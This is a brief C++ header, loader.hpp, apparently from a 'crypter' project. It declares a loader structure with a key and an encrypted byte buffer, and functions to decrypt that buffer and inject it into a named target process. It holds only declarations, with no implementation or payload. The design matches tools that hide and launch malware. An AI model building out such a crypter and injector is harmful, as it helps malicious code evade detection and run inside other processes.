/**
 * loader.hpp
 */

#ifndef CRYPTER_LOADER_H
#define CRYPTER_LOADER_H

#include <string>

#define KEY_SIZE 32

typedef struct loader {
    char *key;
    char *bytes;
    size_t size;
    size_t orig_size;
} loader_t;

void loader_decrypt(loader_t *loader);
int loader_inject(loader_t *loader, const std::string &target);
void loader_free(loader_t *loader);

#endif /* CRYPTER_LOADER_H */